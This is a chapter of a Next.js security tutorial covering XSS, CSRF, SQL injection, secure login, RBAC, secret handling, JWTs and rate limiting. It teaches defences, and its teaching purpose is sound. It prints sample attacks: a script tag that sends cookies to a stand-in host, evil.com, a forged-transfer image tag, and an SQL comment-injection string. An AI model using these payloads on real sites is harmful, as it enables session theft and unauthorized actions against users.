---
title: "Security Best Practices"
description: "Application security is the practice of protecting your web application from malicious actors who attempt to steal data, impersonate users, crash services,"
---

# Section 21: Security Best Practices

## 21.1 What Is Application Security?

Application security is the practice of **protecting your web application from malicious actors** who attempt to steal data, impersonate users, crash services, or gain unauthorized access. In Next.js, security spans the entire stack — from the browser to the server to the database.

> **Simple analogy:** Think of your application as a bank vault. The vault door (authentication), the security cameras (logging), the guards (middleware), and the alarm system (rate limiting) all work together. Neglecting any single layer puts everything at risk.

---

## 21.2 Why Security Matters

| Risk | Consequence Without Security |
|------|------------------------------|
| **Data breach** | User passwords, credit cards, PII exposed |
| **Account takeover** | Users impersonated, trust destroyed |
| **Service disruption** | App made unavailable via DDoS |
| **Legal liability** | GDPR fines, lawsuits, regulatory penalties |
| **Reputation damage** | Users leave, business suffers permanently |

---

## 21.3 Common Vulnerability Landscape

```txt
<svg viewBox="0 0 760 420" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="760" height="420" rx="16" fill="#0f172a"/>
  <text x="380" y="34" text-anchor="middle" fill="#f1f5f9" font-size="17" font-weight="700">Web Application Attack Surface</text>

  <!-- Central App box -->
  <rect x="290" y="170" width="180" height="80" rx="12" fill="#1e40af" stroke="#3b82f6" stroke-width="2"/>
  <text x="380" y="205" text-anchor="middle" fill="#dbeafe" font-size="13" font-weight="700">Next.js App</text>
  <text x="380" y="225" text-anchor="middle" fill="#93c5fd" font-size="10">Your Production Server</text>
  <text x="380" y="240" text-anchor="middle" fill="#93c5fd" font-size="10">API + UI + Database</text>

  <!-- XSS -->
  <rect x="30" y="55" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="100" y="77" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">XSS</text>
  <text x="100" y="95" text-anchor="middle" fill="#fca5a5" font-size="10">Script injection</text>
  <text x="100" y="108" text-anchor="middle" fill="#fca5a5" font-size="9">via user input</text>
  <line x1="170" y1="82" x2="290" y2="190" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- CSRF -->
  <rect x="30" y="165" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="100" y="187" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">CSRF</text>
  <text x="100" y="205" text-anchor="middle" fill="#fca5a5" font-size="10">Forged requests</text>
  <text x="100" y="218" text-anchor="middle" fill="#fca5a5" font-size="9">from other origins</text>
  <line x1="170" y1="192" x2="290" y2="205" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- SQL Injection -->
  <rect x="30" y="275" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="100" y="297" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">SQL Injection</text>
  <text x="100" y="315" text-anchor="middle" fill="#fca5a5" font-size="10">Malicious DB queries</text>
  <text x="100" y="328" text-anchor="middle" fill="#fca5a5" font-size="9">via unsanitized input</text>
  <line x1="170" y1="302" x2="290" y2="225" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Auth Attacks -->
  <rect x="590" y="55" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="660" y="77" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">Auth Attacks</text>
  <text x="660" y="95" text-anchor="middle" fill="#fca5a5" font-size="10">Brute force / stuffing</text>
  <text x="660" y="108" text-anchor="middle" fill="#fca5a5" font-size="9">Weak passwords</text>
  <line x1="590" y1="82" x2="470" y2="190" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Token Leakage -->
  <rect x="590" y="165" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="660" y="187" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">Token Leakage</text>
  <text x="660" y="205" text-anchor="middle" fill="#fca5a5" font-size="10">Exposed JWT / API keys</text>
  <text x="660" y="218" text-anchor="middle" fill="#fca5a5" font-size="9">in client code</text>
  <line x1="590" y1="192" x2="470" y2="205" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Session Hijacking -->
  <rect x="590" y="275" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="660" y="297" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">Session Hijack</text>
  <text x="660" y="315" text-anchor="middle" fill="#fca5a5" font-size="10">Stolen cookies</text>
  <text x="660" y="328" text-anchor="middle" fill="#fca5a5" font-size="9">via network sniff</text>
  <line x1="590" y1="302" x2="470" y2="225" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Rate Limiting (protection) -->
  <rect x="270" y="350" width="220" height="50" rx="8" fill="#065f46" stroke="#10b981" stroke-width="1.5"/>
  <text x="380" y="371" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="700">🛡 Defense Layers</text>
  <text x="380" y="389" text-anchor="middle" fill="#34d399" font-size="10">Rate limiting · CSP · HTTPS · Input validation</text>

  <line x1="380" y1="350" x2="380" y2="250" stroke="#10b981" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#def)"/>

  <defs>
    <marker id="atk" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#f87171"/>
    </marker>
    <marker id="def" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#10b981"/>
    </marker>
  </defs>
</svg>
```

---

## 21.4 XSS — Cross-Site Scripting

**What it is:** An attacker injects malicious JavaScript into your page through user-controlled content (comments, form fields, URL params). When another user views the page, the script executes in their browser.

**Example attack:**
```html
<!-- Attacker submits this as their "name" -->
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Prevention in Next.js:**

Next.js (via React) **automatically escapes** JSX expressions, making it resistant to XSS by default. However, danger exists when using `dangerouslySetInnerHTML`.

```tsx
// app/components/Comment.tsx

// ❌ DANGEROUS — Raw HTML injection
function DangerousComment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// ✅ SAFE — React escapes automatically
function SafeComment({ content }: { content: string }) {
  return <div>{content}</div>;
}

// ✅ SAFE — Sanitize when you MUST use raw HTML (e.g., rich text editors)
import DOMPurify from 'isomorphic-dompurify';

function SanitizedContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Content Security Policy (CSP) header:**

```tsx
// next.config.js — Add CSP headers
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' blob: data: https:;
  font-src 'self';
  connect-src 'self' https://api.yourdomain.com;
  frame-ancestors 'none';
`.replace(/\n/g, '');

/** @type {import('next').NextConfig} */
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: cspHeader,
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
        ],
      },
    ];
  },
};

module.exports = nextConfig;
```

---

## 21.5 CSRF — Cross-Site Request Forgery

**What it is:** A malicious website tricks a logged-in user's browser into making a request to your app — submitting a form, deleting data — without the user's knowledge.

**Example attack:**
```html
<!-- On attacker's website -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000" />
<!-- Browser sends the victim's cookies automatically! -->
```

**Prevention:**

```ts
// middleware.ts — Validate Origin header for mutations
import { NextRequest, NextResponse } from 'next/server';

export function middleware(request: NextRequest) {
  // Only check state-changing methods
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(request.method)) {
    const origin = request.headers.get('origin');
    const allowedOrigin = process.env.NEXTAUTH_URL;

    if (origin && origin !== allowedOrigin) {
      return NextResponse.json(
        { error: 'Forbidden: Invalid origin' },
        { status: 403 }
      );
    }
  }
  return NextResponse.next();
}

export const config = {
  matcher: '/api/:path*',
};
```

```tsx
// For forms — use SameSite cookies + CSRF token
// app/api/auth/[...nextauth]/route.ts
// NextAuth sets cookies with SameSite=lax by default
// For extra protection, use CSRF tokens:

import { randomBytes } from 'crypto';
import { cookies } from 'next/headers';

export async function generateCsrfToken(): Promise<string> {
  const token = randomBytes(32).toString('hex');
  cookies().set('csrf-token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/',
  });
  return token;
}

export function validateCsrfToken(requestToken: string): boolean {
  const storedToken = cookies().get('csrf-token')?.value;
  return !!storedToken && storedToken === requestToken;
}
```

---

## 21.6 SQL Injection

**What it is:** Attackers insert SQL code into user inputs to manipulate your database queries.

**Example attack:**
```sql
-- User enters: admin' --
SELECT * FROM users WHERE email = 'admin' --' AND password = 'anything'
-- The -- comments out the password check entirely!
```

**Prevention — Always use parameterized queries:**

```ts
// app/api/users/route.ts

// ❌ NEVER DO THIS — string concatenation
async function dangerousQuery(email: string) {
  // SQL injection possible!
  return db.execute(`SELECT * FROM users WHERE email = '${email}'`);
}

// ✅ ALWAYS use parameterized queries or an ORM
import { db } from '@/lib/db'; // e.g., Drizzle, Prisma, Postgres.js

// Option 1: Parameterized query (raw SQL)
async function safeQuery(email: string) {
  return db.execute('SELECT * FROM users WHERE email = $1', [email]);
}

// Option 2: ORM (Prisma) — safe by default
import { prisma } from '@/lib/prisma';

async function findUser(email: string) {
  return prisma.user.findUnique({
    where: { email }, // Prisma handles escaping automatically
  });
}

// Option 3: Drizzle ORM
import { users } from '@/db/schema';
import { eq } from 'drizzle-orm';

async function findUserDrizzle(email: string) {
  return db.select().from(users).where(eq(users.email, email));
}
```

---

## 21.7 Authentication Security

### Password Hashing

```ts
// lib/auth/password.ts
import bcrypt from 'bcryptjs';

const SALT_ROUNDS = 12; // Higher = slower but more secure

export async function hashPassword(plaintext: string): Promise<string> {
  // bcrypt automatically generates a salt and hashes
  return bcrypt.hash(plaintext, SALT_ROUNDS);
}

export async function verifyPassword(
  plaintext: string,
  hashed: string
): Promise<boolean> {
  // Constant-time comparison prevents timing attacks
  return bcrypt.compare(plaintext, hashed);
}
```

### Secure Login API Route

```ts
// app/api/auth/login/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';
import { prisma } from '@/lib/prisma';
import { verifyPassword } from '@/lib/auth/password';
import { createSession } from '@/lib/auth/session';
import { rateLimit } from '@/lib/rate-limit';

const LoginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(100),
});

export async function POST(request: NextRequest) {
  // 1. Rate limiting — prevent brute force
  const ip = request.ip ?? '127.0.0.1';
  const { success } = await rateLimit.check(ip, 5); // 5 attempts per minute

  if (!success) {
    return NextResponse.json(
      { error: 'Too many attempts. Please try again later.' },
      { status: 429 }
    );
  }

  try {
    // 2. Validate input
    const body = await request.json();
    const parsed = LoginSchema.safeParse(body);

    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid input' }, { status: 400 });
    }

    const { email, password } = parsed.data;

    // 3. Find user — use generic error message (don't reveal if email exists)
    const user = await prisma.user.findUnique({ where: { email } });

    // ✅ Constant-time check even when user doesn't exist (prevents enumeration)
    const passwordMatch = user
      ? await verifyPassword(password, user.passwordHash)
      : await verifyPassword(password, '$2b$12$fakehashfortimingnormalization');

    if (!user || !passwordMatch) {
      return NextResponse.json(
        { error: 'Invalid email or password' }, // Generic message
        { status: 401 }
      );
    }

    // 4. Create session
    const session = await createSession(user.id);

    const response = NextResponse.json({ success: true });

    // 5. Set secure HTTP-only cookie
    response.cookies.set('session', session.token, {
      httpOnly: true,       // Not accessible via JavaScript
      secure: true,         // HTTPS only
      sameSite: 'lax',      // CSRF protection
      maxAge: 60 * 60 * 24 * 7, // 7 days
      path: '/',
    });

    return response;

  } catch (error) {
    console.error('[Login Error]', error);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
```

---

## 21.8 Authentication Security Flow Diagram

```txt
<svg viewBox="0 0 720 460" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="720" height="460" rx="14" fill="#0f172a"/>
  <text x="360" y="32" text-anchor="middle" fill="#f1f5f9" font-size="16" font-weight="700">Secure Authentication Flow</text>

  <!-- User -->
  <rect x="20" y="65" width="110" height="50" rx="8" fill="#1e3a5f"/>
  <text x="75" y="87" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="600">User</text>
  <text x="75" y="103" text-anchor="middle" fill="#93c5fd" font-size="10">POST /api/login</text>

  <line x1="130" y1="90" x2="165" y2="90" stroke="#475569" stroke-width="1.5" marker-end="url(#sf1)"/>

  <!-- Rate Limiter -->
  <rect x="165" y="65" width="120" height="50" rx="8" fill="#312e81"/>
  <text x="225" y="87" text-anchor="middle" fill="#c4b5fd" font-size="12" font-weight="600">Rate Limiter</text>
  <text x="225" y="103" text-anchor="middle" fill="#a78bfa" font-size="10">5 req/min per IP</text>

  <!-- Rate limit fail -->
  <line x1="225" y1="115" x2="225" y2="155" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#sf2)"/>
  <rect x="165" y="155" width="120" height="40" rx="6" fill="#7f1d1d"/>
  <text x="225" y="171" text-anchor="middle" fill="#fecaca" font-size="10" font-weight="600">429 Too Many</text>
  <text x="225" y="186" text-anchor="middle" fill="#fca5a5" font-size="9">Requests</text>

  <!-- Pass -->
  <line x1="285" y1="90" x2="320" y2="90" stroke="#475569" stroke-width="1.5" marker-end="url(#sf1)"/>

  <!-- Input Validation -->
  <rect x="320" y="65" width="120" height="50" rx="8" fill="#1e40af"/>
  <text x="380" y="87" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="600">Validation</text>
  <text x="380" y="103" text-anchor="middle" fill="#93c5fd" font-size="10">Zod schema check</text>

  <!-- Validation fail -->
  <line x1="380" y1="115" x2="380" y2="155" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#sf2)"/>
  <rect x="320" y="155" width="120" height="40" rx="6" fill="#7f1d1d"/>
  <text x="380" y="171" text-anchor="middle" fill="#fecaca" font-size="10" font-weight="600">400 Bad Request</text>
  <text x="380" y="186" text-anchor="middle" fill="#fca5a5" font-size="9">Invalid input</text>

  <!-- Pass -->
  <line x1="440" y1="90" x2="475" y2="90" stroke="#475569" stroke-width="1.5" marker-end="url(#sf1)"/>

  <!-- DB Lookup + Hash verify -->
  <rect x="475" y="65" width="130" height="50" rx="8" fill="#1e40af"/>
  <text x="540" y="83" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">DB Lookup +</text>
  <text x="540" y="98" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">bcrypt.compare</text>
  <text x="540" y="112" text-anchor="middle" fill="#93c5fd" font-size="9">Constant-time check</text>

  <!-- Hash fail -->
  <line x1="540" y1="115" x2="540" y2="155" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#sf2)"/>
  <rect x="475" y="155" width="130" height="40" rx="6" fill="#7f1d1d"/>
  <text x="540" y="171" text-anchor="middle" fill="#fecaca" font-size="10" font-weight="600">401 Unauthorized</text>
  <text x="540" y="186" text-anchor="middle" fill="#fca5a5" font-size="9">Generic error msg</text>

  <!-- Success path -->
  <line x1="540" y1="65" x2="540" y2="40" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>
  <text x="555" y="55" fill="#6ee7b7" font-size="10">PASS</text>

  <!-- Session creation -->
  <rect x="200" y="230" width="160" height="55" rx="8" fill="#065f46"/>
  <text x="280" y="252" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="600">Create Session</text>
  <text x="280" y="268" text-anchor="middle" fill="#34d399" font-size="10">Signed token</text>
  <text x="280" y="282" text-anchor="middle" fill="#34d399" font-size="9">DB record created</text>

  <!-- Arrow from hash pass to session -->
  <path d="M540 40 Q540 20 380 20 Q280 20 280 230" stroke="#34d399" stroke-width="1.5" fill="none" marker-end="url(#sf3)"/>

  <!-- Set cookie -->
  <rect x="380" y="230" width="200" height="55" rx="8" fill="#065f46"/>
  <text x="480" y="252" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="600">Set Secure Cookie</text>
  <text x="480" y="268" text-anchor="middle" fill="#34d399" font-size="10">httpOnly · secure · sameSite</text>
  <text x="480" y="282" text-anchor="middle" fill="#34d399" font-size="9">maxAge: 7 days</text>

  <line x1="360" y1="257" x2="380" y2="257" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>

  <!-- 200 Response -->
  <rect x="250" y="325" width="260" height="45" rx="8" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1"/>
  <text x="380" y="347" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="600">200 OK — Login Successful</text>
  <text x="380" y="362" text-anchor="middle" fill="#93c5fd" font-size="9">User redirected to dashboard</text>

  <line x1="480" y1="285" x2="420" y2="325" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>
  <line x1="280" y1="285" x2="340" y2="325" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>

  <!-- Audit log -->
  <rect x="200" y="390" width="360" height="40" rx="8" fill="#1e293b" stroke="#475569"/>
  <text x="380" y="408" text-anchor="middle" fill="#94a3b8" font-size="11" font-weight="600">Audit Log</text>
  <text x="380" y="423" text-anchor="middle" fill="#64748b" font-size="9">Login attempt (success/fail) · IP · Timestamp</text>

  <defs>
    <marker id="sf1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#475569"/>
    </marker>
    <marker id="sf2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#f87171"/>
    </marker>
    <marker id="sf3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#34d399"/>
    </marker>
  </defs>
</svg>
```

---

## 21.9 Authorization & Role-Based Access Control (RBAC)

```ts
// lib/auth/rbac.ts
export type Role = 'admin' | 'editor' | 'viewer';

export const permissions = {
  'admin':  ['read', 'write', 'delete', 'manage_users'],
  'editor': ['read', 'write'],
  'viewer': ['read'],
} as const;

type Permission = typeof permissions[Role][number];

export function hasPermission(role: Role, permission: Permission): boolean {
  return (permissions[role] as readonly string[]).includes(permission);
}
```

```ts
// middleware.ts — Route-level authorization
import { NextRequest, NextResponse } from 'next/server';
import { getSession } from '@/lib/auth/session';
import { hasPermission } from '@/lib/auth/rbac';

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  // Public routes — no auth needed
  const publicRoutes = ['/', '/login', '/register', '/api/auth'];
  if (publicRoutes.some(route => pathname.startsWith(route))) {
    return NextResponse.next();
  }

  // Verify session
  const session = await getSession(request);
  if (!session) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  // Admin-only routes
  if (pathname.startsWith('/admin') && session.role !== 'admin') {
    return NextResponse.redirect(new URL('/unauthorized', request.url));
  }

  // API route authorization
  if (pathname.startsWith('/api/admin') && !hasPermission(session.role, 'manage_users')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  // Attach user info to headers for server components
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-user-id', session.userId);
  requestHeaders.set('x-user-role', session.role);

  return NextResponse.next({ request: { headers: requestHeaders } });
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

---

## 21.10 Environment Variables & Secret Management

```bash
# .env.local — Local development secrets (NEVER commit)
DATABASE_URL=postgresql://user:pass@localhost:5432/mydb
JWT_SECRET=your-super-secret-jwt-key-min-32-chars
NEXTAUTH_SECRET=another-secret-for-nextauth
STRIPE_SECRET_KEY=sk_test_...
SENDGRID_API_KEY=SG....

# Public env vars (safe to expose to browser)
NEXT_PUBLIC_APP_URL=http://localhost:3000
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_test_...
```

```tsx
// lib/env.ts — Validate all required env vars at startup
import { z } from 'zod';

const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32, 'JWT_SECRET must be at least 32 characters'),
  NEXTAUTH_SECRET: z.string().min(32),
  NODE_ENV: z.enum(['development', 'test', 'production']),
  // Public vars
  NEXT_PUBLIC_APP_URL: z.string().url(),
});

// Throws at build time if any required env var is missing
const parsed = envSchema.safeParse(process.env);

if (!parsed.success) {
  console.error('❌ Invalid environment variables:');
  console.error(parsed.error.flatten().fieldErrors);
  throw new Error('Invalid environment variables');
}

export const env = parsed.data;
```

**Critical rules:**
- ✅ Variables without `NEXT_PUBLIC_` prefix are **server-only** — never exposed to the browser
- ❌ Never put database URLs or API secrets in `NEXT_PUBLIC_` variables
- ✅ Use `.env.local` for local dev, CI/CD platform secrets for production
- ✅ Rotate secrets immediately if they are ever accidentally committed

---

## 21.11 JWT vs Session Security

| Aspect | JWT (JSON Web Token) | Server Sessions |
|--------|---------------------|-----------------|
| **Storage** | Client (cookie/localStorage) | Server (DB/Redis) |
| **Revocation** | Hard (need blocklist) | Easy (delete from DB) |
| **Scalability** | Excellent (stateless) | Requires shared store |
| **Token size** | Larger (~300 bytes) | Small (ID only) |
| **Expiry control** | Built-in `exp` claim | Full server control |
| **Security risk** | Token stolen = full access | Session ID stolen = risk |
| **Best for** | Microservices, APIs | Traditional web apps |

```ts
// lib/auth/jwt.ts
import { SignJWT, jwtVerify } from 'jose';

const secret = new TextEncoder().encode(process.env.JWT_SECRET);

export async function signToken(payload: Record<string, unknown>): Promise<string> {
  return new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('1h')        // Short expiry
    .setIssuer('https://yourdomain.com')
    .setAudience('https://yourdomain.com')
    .sign(secret);
}

export async function verifyToken(token: string) {
  const { payload } = await jwtVerify(token, secret, {
    issuer: 'https://yourdomain.com',
    audience: 'https://yourdomain.com',
  });
  return payload;
}
```

---

## 21.12 HTTP vs HTTPS Comparison

| Feature | HTTP | HTTPS |
|---------|------|-------|
| **Encryption** | ❌ None | ✅ TLS/SSL |
| **Data in transit** | Plaintext (readable) | Encrypted |
| **Cookie security** | Cookies can be stolen | `Secure` flag enforced |
| **MITM attacks** | Vulnerable | Protected |
| **Browser indicator** | ⚠️ Not secure | 🔒 Secure padlock |
| **SEO impact** | Penalized by Google | Rewarded |
| **Required for** | — | PWAs, Service Workers, HTTP/2 |

---

## 21.13 Rate Limiting

```ts
// lib/rate-limit.ts
import { LRUCache } from 'lru-cache';

type RateLimitOptions = {
  uniqueTokenPerInterval?: number;
  interval?: number; // milliseconds
};

export function rateLimiter(options: RateLimitOptions = {}) {
  const tokenCache = new LRUCache<string, number[]>({
    max: options.uniqueTokenPerInterval || 500,
    ttl: options.interval || 60_000, // 1 minute
  });

  return {
    check: (token: string, limit: number): { success: boolean; remaining: number } => {
      const tokenCount = tokenCache.get(token) ?? [];
      const now = Date.now();
      const windowStart = now - (options.interval || 60_000);

      // Filter out old requests
      const recentRequests = tokenCount.filter(t => t > windowStart);
      recentRequests.push(now);
      tokenCache.set(token, recentRequests);

      const remaining = Math.max(0, limit - recentRequests.length);
      return {
        success: recentRequests.length <= limit,
        remaining,
      };
    },
  };
}

// Usage in API route
const limiter = rateLimiter({ interval: 60_000, uniqueTokenPerInterval: 500 });

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for') ?? '127.0.0.1';
  const { success, remaining } = limiter.check(ip, 10);

  if (!success) {
    return Response.json(
      { error: 'Rate limit exceeded' },
      {
        status: 429,
        headers: {
          'Retry-After': '60',
          'X-RateLimit-Remaining': String(remaining),
        },
      }
    );
  }
  // ... handle request
}
```

---

## 21.14 Secure API Route Pattern

```ts
// app/api/posts/[id]/route.ts — Complete secure route example
import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth/options';
import { prisma } from '@/lib/prisma';
import { hasPermission } from '@/lib/auth/rbac';
import { rateLimiter } from '@/lib/rate-limit';

const limiter = rateLimiter({ interval: 60_000 });

const UpdatePostSchema = z.object({
  title: z.string().min(1).max(200).optional(),
  content: z.string().min(1).max(50_000).optional(),
});

export async function PATCH(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  // 1. Rate limiting
  const ip = request.headers.get('x-forwarded-for') ?? 'unknown';
  const { success } = limiter.check(ip, 20);
  if (!success) {
    return NextResponse.json({ error: 'Too many requests' }, { status: 429 });
  }

  // 2. Authentication
  const session = await getServerSession(authOptions);
  if (!session?.user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // 3. Authorization
  if (!hasPermission(session.user.role, 'write')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  // 4. Input validation
  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: 'Invalid JSON' }, { status: 400 });
  }

  const parsed = UpdatePostSchema.safeParse(body);
  if (!parsed.success) {
    return NextResponse.json(
      { error: 'Validation failed', details: parsed.error.flatten() },
      { status: 400 }
    );
  }

  // 5. Resource ownership check
  const post = await prisma.post.findUnique({ where: { id: params.id } });
  if (!post) {
    return NextResponse.json({ error: 'Not found' }, { status: 404 });
  }

  // Users can only edit their own posts (admins can edit any)
  if (post.authorId !== session.user.id && session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  // 6. Safe update
  const updated = await prisma.post.update({
    where: { id: params.id },
    data: parsed.data,
  });

  return NextResponse.json({ post: updated });
}
```

---

## 21.15 Request Security Workflow Diagram

```txt
<svg viewBox="0 0 700 340" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="700" height="340" rx="14" fill="#0f172a"/>
  <text x="350" y="28" text-anchor="middle" fill="#f1f5f9" font-size="15" font-weight="700">API Request Security Layers</text>

  <!-- Layers stacked vertically -->
  <!-- Layer 1: HTTPS -->
  <rect x="100" y="45" width="500" height="38" rx="8" fill="#065f46" stroke="#10b981" stroke-width="1"/>
  <text x="350" y="60" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="700">Layer 1: HTTPS / TLS</text>
  <text x="350" y="75" text-anchor="middle" fill="#34d399" font-size="9">Encrypts data in transit · Prevents MITM · SSL certificate</text>

  <line x1="350" y1="83" x2="350" y2="95" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 2: CSP / Headers -->
  <rect x="100" y="95" width="500" height="38" rx="8" fill="#1e40af" stroke="#3b82f6" stroke-width="1"/>
  <text x="350" y="110" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">Layer 2: Security Headers</text>
  <text x="350" y="125" text-anchor="middle" fill="#93c5fd" font-size="9">CSP · X-Frame-Options · HSTS · Referrer-Policy</text>

  <line x1="350" y1="133" x2="350" y2="145" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 3: Rate Limit -->
  <rect x="100" y="145" width="500" height="38" rx="8" fill="#312e81" stroke="#6366f1" stroke-width="1"/>
  <text x="350" y="160" text-anchor="middle" fill="#c4b5fd" font-size="11" font-weight="700">Layer 3: Rate Limiting</text>
  <text x="350" y="175" text-anchor="middle" fill="#a78bfa" font-size="9">IP-based · Token-based · DDoS protection</text>

  <line x1="350" y1="183" x2="350" y2="195" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 4: Auth -->
  <rect x="100" y="195" width="500" height="38" rx="8" fill="#1e40af" stroke="#3b82f6" stroke-width="1"/>
  <text x="350" y="210" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">Layer 4: Authentication</text>
  <text x="350" y="225" text-anchor="middle" fill="#93c5fd" font-size="9">Session / JWT verification · Cookie validation</text>

  <line x1="350" y1="233" x2="350" y2="245" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 5: Authz -->
  <rect x="100" y="245" width="500" height="38" rx="8" fill="#1e40af" stroke="#3b82f6" stroke-width="1"/>
  <text x="350" y="260" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">Layer 5: Authorization</text>
  <text x="350" y="275" text-anchor="middle" fill="#93c5fd" font-size="9">Role check · Resource ownership · RBAC</text>

  <line x1="350" y1="283" x2="350" y2="295" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Core -->
  <rect x="200" y="295" width="300" height="35" rx="8" fill="#065f46" stroke="#10b981" stroke-width="1.5"/>
  <text x="350" y="316" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="700">✅ Business Logic — Handler Executes</text>

  <!-- Left reject arrows -->
  <line x1="100" y1="114" x2="55" y2="114" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>
  <line x1="100" y1="164" x2="55" y2="164" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>
  <line x1="100" y1="214" x2="55" y2="214" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>
  <line x1="100" y1="264" x2="55" y2="264" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>

  <rect x="5" y="95" width="50" height="175" rx="6" fill="#7f1d1d"/>
